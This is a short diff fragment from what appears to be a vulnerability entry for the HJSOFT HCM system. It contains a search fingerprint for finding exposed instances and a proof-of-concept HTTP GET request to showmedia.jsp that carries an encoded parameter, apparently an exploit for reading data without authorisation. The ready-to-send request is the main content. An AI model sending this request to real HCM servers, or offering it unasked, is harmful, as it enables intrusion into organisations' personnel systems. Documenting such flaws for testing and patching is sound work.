@@ -8,7 +8,7 @@
 app="HJSOFT-HCM"
 ```
 
-## poc
+## POC
 
 ```
 GET /train/resource/course/showmedia.jsp?a_code&r5100=RzvoYYlxoMjNIPAATTP2HJBPAATTPGGqY4XJPloJ5D5mnYCLzn1uPAATTP2HJBPAATTPQPnPAATTP2HJBPAATTPXdzNJ8pj7I9Y5s1xDAUfUx HTTP/1.1
